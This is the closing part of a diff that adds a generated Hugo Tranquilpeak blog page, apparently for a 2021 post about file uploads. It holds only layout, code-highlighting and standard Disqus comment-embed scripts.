+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/Zor01478.github.io\/2021\/02\/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\/';
+          
+            this.page.identifier = '\/2021\/02\/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'hugo-tranquilpeak-theme';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
